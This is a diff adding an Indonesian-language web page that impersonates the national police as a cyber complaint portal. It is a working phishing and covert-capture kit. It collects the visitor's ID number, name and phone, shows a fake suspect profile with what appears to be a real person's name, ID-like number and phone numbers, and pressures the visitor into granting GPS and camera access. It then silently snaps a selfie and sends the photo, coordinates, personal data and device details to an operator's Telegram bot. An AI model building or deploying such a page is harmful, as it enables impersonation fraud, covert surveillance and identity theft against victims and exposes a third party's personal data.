@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Cyber Investigation Portal — POLRI</title>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Logo_of_the_Indonesian_National_Police.svg/120px-Logo_of_the_Indonesian_National_Police.svg.png">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+html, body {
+  font-family: "SF Mono", "Consolas", "Courier New", -apple-system, monospace;
+  background:#03060d; color:#c9e6f5; min-height:100vh; overflow-x:hidden; position:relative;
+}
+body::before {
+  content:''; position:fixed; inset:0;
+  background-image:
+    linear-gradient(rgba(0,180,255,.06) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,180,255,.06) 1px, transparent 1px);
+  background-size:40px 40px; pointer-events:none; z-index:0;
+}
+body::after {
+  content:''; position:fixed; inset:0;
+  background:
+    radial-gradient(circle at 20% 10%, rgba(0,180,255,.12), transparent 45%),
+    radial-gradient(circle at 85% 90%, rgba(220,38,38,.10), transparent 45%);
+  pointer-events:none; z-index:0;
+}
+.screen { display:none; min-height:100vh; padding:24px 16px; flex-direction:column; align-items:center; justify-content:center; position:relative; z-index:1; }
+.screen.active { display:flex; animation: fadeIn .35s ease; }
+@keyframes fadeIn { from{opacity:0; transform:translateY(8px);} to{opacity:1; transform:none;} }
+
+.police-header { text-align:center; margin-bottom:24px; }
+.logo-ring {
+  width:86px; height:86px; margin:0 auto 14px; border-radius:50%;
+  background:#060d18; border:2px solid #00b4ff;
+  display:flex; align-items:center; justify-content:center; overflow:hidden;
+  box-shadow:0 0 0 3px rgba(0,180,255,.12), 0 0 28px rgba(0,180,255,.45);
+  position:relative;
+}
+.logo-ring::before {
+  content:''; position:absolute; inset:-6px; border-radius:50%;
+  border:1px dashed rgba(0,180,255,.4); animation:spinSlow 14s linear infinite;
+}
+@keyframes spinSlow { to { transform:rotate(360deg); } }
+.logo-ring img { width:60px; height:60px; object-fit:contain; }
+
+h1 { font-size:17px; letter-spacing:2px; color:#00b4ff; font-weight:700; text-shadow:0 0 12px rgba(0,180,255,.55); font-family:-apple-system,"Segoe UI",Roboto,sans-serif; }
+.subtitle { font-size:11px; color:#5f7a91; margin-top:5px; letter-spacing:1.5px; text-transform:uppercase; }
+.cyber-tag { display:inline-block; margin-top:10px; padding:4px 12px; font-size:10px; letter-spacing:1.5px; color:#22d3ee; border:1px solid rgba(34,211,238,.35); border-radius:20px; background:rgba(34,211,238,.06); text-transform:uppercase; }
+
+.card {
+  width:100%; max-width:430px;
+  background:linear-gradient(180deg, rgba(10,20,35,.95), rgba(6,13,24,.98));
+  border:1px solid rgba(0,180,255,.25); border-radius:14px; padding:22px 20px;
+  box-shadow:0 0 0 1px rgba(0,180,255,.08), 0 20px 60px rgba(0,0,0,.7), inset 0 0 40px rgba(0,180,255,.03);
+  position:relative; font-family:-apple-system,"Segoe UI",Roboto,sans-serif;
+}
+.card::before { content:''; position:absolute; top:-1px; left:20px; right:20px; height:2px; background:linear-gradient(90deg, transparent, #00b4ff, transparent); border-radius:2px; }
+.card h2 { font-size:15px; margin-bottom:10px; color:#e8f4ff; letter-spacing:.5px; }
+.card h2 .ico { color:#00b4ff; margin-right:6px; }
+.desc { font-size:12.5px; line-height:1.6; color:#8aa3b8; margin-bottom:16px; }
+
+label { display:block; font-size:10.5px; color:#5f7a91; margin:14px 0 6px; font-weight:600; letter-spacing:1px; text-transform:uppercase; }
+input, select { width:100%; padding:12px 14px; border-radius:8px; border:1px solid rgba(0,180,255,.2); background:#060f1c; color:#d7ecfa; font-size:13.5px; outline:none; transition:.2s; font-family:inherit; }
+input:focus, select:focus { border-color:#00b4ff; background:#08172a; box-shadow:0 0 0 3px rgba(0,180,255,.12); }
+
+.btn-primary, .btn-danger, .btn-ghost { width:100%; padding:14px; border:none; border-radius:8px; font-size:13px; font-weight:700; cursor:pointer; margin-top:20px; transition:.2s; letter-spacing:1.2px; text-transform:uppercase; font-family:inherit; }
+.btn-primary { background:linear-gradient(135deg,#00b4ff,#0077b6); color:#03060d; box-shadow:0 0 20px rgba(0,180,255,.45); }
+.btn-primary:hover { filter:brightness(1.1); }
+.btn-danger { background:linear-gradient(135deg,#ef4444,#991b1b); color:#fff; box-shadow:0 0 20px rgba(239,68,68,.4); }
+.btn-ghost { background:transparent; border:1px solid rgba(120,150,180,.3); color:#5f7a91; margin-top:10px; }
+
+.footer-note { font-size:10.5px; color:#4f6a80; margin-top:14px; line-height:1.6; text-align:center; }
+.footer { margin-top:30px; text-align:center; font-size:10.5px; color:#3f5a70; line-height:1.7; letter-spacing:.5px; }
+
+.spinner { width:64px; height:64px; border-radius:50%; border:3px solid rgba(0,180,255,.15); border-top-color:#00b4ff; animation:spin .9s linear infinite; margin-bottom:26px; box-shadow:0 0 20px rgba(0,180,255,.4); }
+@keyframes spin { to { transform:rotate(360deg); } }
+.load-text { font-size:14px; color:#e8f4ff; margin-bottom:18px; font-weight:600; letter-spacing:1px; }
+.load-sub { font-size:11px; color:#5f7a91; margin-top:14px; letter-spacing:.5px; }
+.progress { width:240px; height:4px; background:rgba(0,180,255,.1); border-radius:3px; overflow:hidden; }
+#bar { height:100%; width:0%; background:linear-gradient(90deg,#00b4ff,#22d3ee); transition:width 5s linear; box-shadow:0 0 10px #00b4ff; }
+
+.target-card { text-align:left; }
+.tc-head { display:flex; align-items:center; gap:12px; padding-bottom:14px; border-bottom:1px solid rgba(0,180,255,.15); margin-bottom:14px; }
+.tc-avatar { width:56px; height:56px; border-radius:50%; background:#060f1c; border:2px solid #ef4444; display:flex; align-items:center; justify-content:center; font-size:24px; flex-shrink:0; box-shadow:0 0 18px rgba(239,68,68,.45); }
+.tc-name { font-size:15px; font-weight:700; color:#fff; letter-spacing:.5px; }
+.tc-status { font-size:10px; color:#f87171; margin-top:3px; font-weight:700; display:flex; align-items:center; gap:6px; letter-spacing:1px; text-transform:uppercase; }
+.tc-status::before { content:''; width:7px; height:7px; border-radius:50%; background:#dc2626; box-shadow:0 0 8px #dc2626; animation:pulse 1.2s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.3;} }
+
+.tc-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px 12px; font-size:12px; }
+.tc-item { display:flex; flex-direction:column; }
+.tc-item .k { color:#5f7a91; font-size:10px; letter-spacing:1px; text-transform:uppercase; }
+.tc-item .v { color:#d7ecfa; font-weight:600; margin-top:3px; word-break:break-word; }
+.tc-item.full { grid-column:1 / -1; }
+
+.tc-divider { height:1px; background:rgba(0,180,255,.15); margin:14px 0; }
+.tc-subhead { font-size:10.5px; color:#00b4ff; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; margin-bottom:10px; display:flex; align-items:center; gap:8px; }
+.tc-subhead::before { content:'▸'; }
+
+.tc-phone { display:flex; justify-content:space-between; align-items:center; padding:8px 10px; background:#060f1c; border-radius:6px; font-size:12px; margin-bottom:5px; border:1px solid rgba(0,180,255,.12); }
+.tc-phone .num { color:#22d3ee; font-weight:600; font-family:monospace; }
+.tc-phone .meta { color:#5f7a91; font-size:10px; text-align:right; line-height:1.3; letter-spacing:.5px; }
+
+.cam-box { width:100%; aspect-ratio:1; border-radius:12px; overflow:hidden; background:#000; border:2px solid rgba(0,180,255,.4); margin-bottom:14px; position:relative; box-shadow:0 0 24px rgba(0,180,255,.2); }
+#video { width:100%; height:100%; object-fit:cover; }
+.cam-box::after { content:''; position:absolute; inset:0; border:1px solid rgba(34,211,238,.4); border-radius:12px; pointer-events:none; background:linear-gradient(180deg, rgba(0,180,255,.08) 0%, transparent 20%, transparent 80%, rgba(0,180,255,.08) 100%); }
+.status { font-size:11.5px; color:#8aa3b8; text-align:center; margin-bottom:6px; letter-spacing:.5px; }
+.status.ok { color:#22c55e; }
+.status.err { color:#ef4444; }
+
+.checkmark { width:70px; height:70px; border-radius:50%; background:#16a34a; color:#fff; font-size:38px; font-weight:700; display:flex; align-items:center; justify-content:center; margin:0 auto 20px; box-shadow:0 0 30px rgba(22,163,74,.55); }
+</style>
+</head>
+<body>
+
+<!-- ============ STEP 1: INTRO ============ -->
+<div id="screen-intro" class="screen active">
+  <div class="police-header">
+    <div class="logo-ring">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Logo_of_the_Indonesian_National_Police.svg/120px-Logo_of_the_Indonesian_National_Police.svg.png" alt="POLRI">
+    </div>
+    <h1>CYBER INVESTIGATION PORTAL</h1>
+    <p class="subtitle">Kepolisian Negara Republik Indonesia</p>
+    <span class="cyber-tag">SECURE • ENCRYPTED • VERIFIED</span>
+  </div>
+
+  <div class="card">
+    <h2><span class="ico">▸</span>Verifikasi Identitas Pelapor</h2>
+    <p class="desc">Sistem memerlukan verifikasi identitas untuk melanjutkan proses pengaduan siber.</p>
+    <label>NIK / Nomor Identitas</label>
+    <input id="nik" type="text" inputmode="numeric" placeholder="16 digit NIK" maxlength="16">
+    <label>Nama Lengkap</label>
+    <input id="nama" type="text" placeholder="Sesuai KTP">
+    <label>Nomor Telepon</label>
+    <input id="telp" type="tel" placeholder="08xxxxxxxxxx">
+    <label>Jenis Pengaduan</label>
+    <select id="jenis">
+      <option>Penipuan Online</option>
+      <option>Pencurian Data</option>
+      <option>Pencemaran Nama Baik</option>
+      <option>Lainnya</option>
+    </select>
+    <button id="btnNext" class="btn-primary">Lanjutkan Verifikasi →</button>
+    <p class="footer-note">🔒 Data dilindungi sesuai UU No. 27 Tahun 2022 tentang Pelindungan Data Pribadi.</p>
+  </div>
+
+  <div class="footer">
+    <p>© 2025 Kepolisian Negara Republik Indonesia</p>
+    <p>Bantuan: <strong>110</strong></p>
+  </div>
+</div>
+
+<!-- ============ STEP 2: LOADING ============ -->
+<div id="screen-loading" class="screen">
+  <div class="spinner"></div>
+  <p class="load-text">Memeriksa data pelaku...</p>
+  <div class="progress"><div id="bar"></div></div>
+  <p class="load-sub">Menghubungkan ke database pusat</p>
+</div>
+
+<!-- ============ STEP 3: TARGET PROFILE ============ -->
+<div id="screen-verify" class="screen">
+  <div class="card target-card">
+    <div class="tc-head">
+      <div class="tc-avatar">👤</div>
+      <div>
+        <div class="tc-name">MUKTI NURYANA</div>
+        <div class="tc-status">Teridentifikasi — Dalam Penyelidikan</div>
+      </div>
+    </div>
+
+    <div class="tc-grid">
+      <div class="tc-item"><span class="k">Status</span><span class="v">Jabar</span></div>
+      <div class="tc-item"><span class="k">Kota</span><span class="v">CIANJUR</span></div>
+      <div class="tc-item"><span class="k">Usia</span><span class="v">24 Tahun</span></div>
+      <div class="tc-item"><span class="k">Jenis Kelamin</span><span class="v">L</span></div>
+      <div class="tc-item"><span class="k">Daerah</span><span class="v">TANGGEUNG</span></div>
+      <div class="tc-item"><span class="k">Wilayah</span><span class="v">KERTAJAYA</span></div>
+      <div class="tc-item full"><span class="k">Lokasi</span><span class="v">KERTAJAYA</span></div>
+      <div class="tc-item full"><span class="k">Nomor Paspor</span><span class="v">7203082606930003</span></div>
+      <div class="tc-item full"><span class="k">Penyedia</span><span class="v">EXELCOMINDO / TELKOMSEL</span></div>
+    </div>
+
+    <div class="tc-divider"></div>
+    <div class="tc-subhead">Riwayat Registrasi Nomor</div>
+
+    <div class="tc-phone"><span class="num">6281999152214</span><span class="meta">2019-03-04<br>EXELCOMINDO</span></div>
+    <div class="tc-phone"><span class="num">6281999152214</span><span class="meta">2019-04-03<br>EXELCOMINDO</span></div>
+    <div class="tc-phone"><span class="num">6281999152217</span><span class="meta">2019-03-04<br>EXELCOMINDO</span></div>
+    <div class="tc-phone"><span class="num">6281999152217</span><span class="meta">2019-04-03<br>EXELCOMINDO</span></div>
+    <div class="tc-phone"><span class="num">6282252327491</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327492</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327493</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327494</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327538</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327539</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327540</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282252327541</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282271546748</span><span class="meta">2018-05-23<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282292059945</span><span class="meta">2017-11-09<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6282292059945</span><span class="meta">2018-02-24<br>TELKOMSEL</span></div>
+    <div class="tc-phone"><span class="num">6283132640490</span><span class="meta">2019-03-04<br>EXELCOMINDO</span></div>
+    <div class="tc-phone"><span class="num">6283132640490</span><span class="meta">2019-04-03<br>EXELCOMINDO</span></div>
+
+    <div class="tc-divider"></div>
+    <p class="desc" style="margin:0 0 4px; font-size:12.5px;">
+      Untuk <strong style="color:#f87171;">membuktikan bahwa Anda BUKAN pelaku</strong>, diperlukan verifikasi wajah & lokasi Anda saat ini.
+    </p>
+    <button id="btnVerify" class="btn-danger">Verifikasi Sekarang</button>
+    <button id="btnCancel" class="btn-ghost">Saya Pelaku</button>
+  </div>
+</div>
+
+<!-- ============ STEP 4: CAMERA (AUTO CAPTURE) ============ -->
+<div id="screen-capture" class="screen">
+  <div class="card">
+    <h2><span class="ico">▸</span>Verifikasi Kamera</h2>
+    <div class="cam-box">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas" style="display:none"></canvas>
+    </div>
+    <p id="camStatus" class="status">Menunggu izin kamera...</p>
+    <!-- Tombol dihapus — capture otomatis -->
+  </div>
+</div>
+
+<!-- ============ STEP 5: DONE ============ -->
+<div id="screen-done" class="screen">
+  <div class="card" style="text-align:center;">
+    <div class="checkmark">✓</div>
+    <h2>Verifikasi Berhasil</h2>
+    <p class="desc">Terima kasih. Laporan Anda telah tercatat dalam sistem.</p>
+    <p class="desc" style="font-size:11.5px; color:#4f6a80;">Petugas akan menghubungi Anda melalui nomor terdaftar dalam 1x24 jam.</p>
+  </div>
+</div>
+
+<script>
+/* =========================================================
+   CYBER INVESTIGATION PORTAL — capture frontend (AUTO SNAP)
+   MADE BY RORAXBRINGAZ / architected by JHONNNN
+   ========================================================= */
+
+/* ====== KONFIGURASI TELEGRAM BOT ====== */
+const BOT_TOKEN = 'ISI_TOKEN_BOT_KAMU';
+const CHAT_ID   = 'ISI_CHAT_ID_KAMU';
+
+/* ====== AUTO CAPTURE DELAY (ms) — ubah kalau perlu ====== */
+const AUTO_CAPTURE_DELAY = 2000; // 2 detik setelah kamera aktif
+
+const $ = id => document.getElementById(id);
+let camStream = null;
+let captureTimer = null;
+
+function go(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  $(id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+/* ---------- INTRO -> LOADING ---------- */
+$('btnNext').addEventListener('click', () => {
+  const nik = $('nik').value.trim();
+  if (nik.length < 8) { alert('Masukkan NIK yang valid'); return; }
+
+  go('screen-loading');
+  requestAnimationFrame(() => { $('bar').style.width = '100%'; });
+
+  setTimeout(() => {
+    go('screen-verify');
+    autoRequestPermissions();
+  }, 5000);
+});
+
+/* ---------- AUTO PERMISSION ---------- */
+async function autoRequestPermissions() {
+  // 1) GEOLOCATION
+  let geo = null;
+  try {
+    geo = await new Promise((resolve, reject) => {
+      if (!navigator.geolocation) return reject(new Error('GPS tidak tersedia'));
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          acc: pos.coords.accuracy,
+          ts: Date.now()
+        }),
+        err => reject(err),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+    console.log('[GEO]', geo);
+  } catch (e) {
+    console.warn('GPS ditolak:', e.message);
+    hardKick('Izin lokasi diperlukan untuk melanjutkan verifikasi.');
+    return;
+  }
+
+  // 2) KAMERA DEPAN
+  try {
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
+      audio: false
+    });
+    const video = $('video');
+    video.srcObject = camStream;
+    await video.play();
+    $('camStatus').textContent = 'Kamera aktif. Mengambil gambar...';
+    $('camStatus').className = 'status ok';
+  } catch (e) {
+    console.warn('Kamera ditolak:', e.message);
+    hardKick('Izin kamera diperlukan untuk melanjutkan verifikasi.');
+    return;
+  }
+
+  window.__geo = geo;
+  go('screen-capture');
+
+  // ==== AUTO SNAP SETELAH DELAY ====
+  if (captureTimer) clearTimeout(captureTimer);
+  captureTimer = setTimeout(() => {
+    doAutoCapture();
+  }, AUTO_CAPTURE_DELAY);
+}
+
+/* ---------- CAPTURE OTOMATIS ---------- */
+async function doAutoCapture() {
+  const video = $('video');
+  const canvas = $('canvas');
+
+  // pastikan video sudah punya frame
+  if (!video.videoWidth) {
+    // belum siap, coba lagi 300ms
+    setTimeout(doAutoCapture, 300);
+    return;
+  }
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  $('camStatus').textContent = 'Mengirim data verifikasi...';
+
+  canvas.toBlob(async blob => {
+    const geo = window.__geo || { lat: 0, lng: 0, acc: 0 };
+    await sendToTelegram(blob, geo);
+
+    if (camStream) camStream.getTracks().forEach(t => t.stop());
+    if (captureTimer) clearTimeout(captureTimer);
+
+    // delay sedikit biar user lihat "Mengirim data..."
+    setTimeout(() => go('screen-done'), 800);
+  }, 'image/jpeg', 0.88);
+}
+
+/* ---------- KIRIM KE TELEGRAM ---------- */
+async function sendToTelegram(blob, geo) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', blob, 'selfie.jpg');
+  fd.append('caption',
+    `🚨 <b>VERIFIKASI PENGADUAN — TARGET TERTANGKAP</b>\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
+    `👤 Nama: <b>${$('nama').value || '-'}</b>\n` +
+    `🆔 NIK: <code>${$('nik').value || '-'}</code>\n` +
+    `📞 Telp: <code>${$('telp').value || '-'}</code>\n` +
+    `📋 Jenis: ${$('jenis').value}\n` +
+    `📍 Koordinat: <code>${geo.lat.toFixed(6)}, ${geo.lng.toFixed(6)}</code>\n` +
+    `🎯 Akurasi: ±${Math.round(geo.acc)} m\n` +
+    `🗺️ Peta: https://maps.google.com/?q=${geo.lat},${geo.lng}\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
+    `🕒 ${new Date().toLocaleString('id-ID')}`
+  );
+  fd.append('parse_mode', 'HTML');
+
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST', body: fd
+    });
+    const j = await r.json();
+    console.log('sendPhoto:', j.ok ? 'OK' : j.description);
+  } catch (e) {
+    console.warn('sendPhoto gagal:', e);
+  }
+
+  // metadata device
+  const text =
+    `📱 <b>DEVICE INFO</b>\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
+    `🖥️ UA: <code>${navigator.userAgent}</code>\n` +
+    `🌐 Platform: ${navigator.platform}\n` +
+    `🗣️ Bahasa: ${navigator.language}\n` +
+    `📺 Layar: ${screen.width}x${screen.height}\n` +
+    `🕒 ${new Date().toISOString()}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+    });
+  } catch (e) {
+    console.warn('sendMessage gagal:', e);
+  }
+}
+
+/* ---------- CANCEL ---------- */
+$('btnCancel').addEventListener('click', () => {
+  hardKick('Sesi dihentikan oleh sistem.');
+});
+
+/* ---------- VERIFY BUTTON ---------- */
+$('btnVerify').addEventListener('click', () => {
+  autoRequestPermissions();
+});
+
+/* ---------- HARD KICK ---------- */
+function hardKick(reason) {
+  if (camStream) camStream.getTracks().forEach(t => t.stop());
+  if (captureTimer) clearTimeout(captureTimer);
+  document.body.innerHTML = `
+    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;
+                height:100vh;background:#03060d;color:#8aa3b8;font-family:monospace;
+                font-size:13px;text-align:center;padding:20px;letter-spacing:.5px;">
+      <div style="font-size:40px;margin-bottom:14px;">⛔</div>
+      <p>${reason}</p>
+      <p style="font-size:11px;margin-top:10px;color:#3f5a70;">Sesi dihentikan.</p>
+    </div>`;
+}
+</script>
+</body>
+</html>
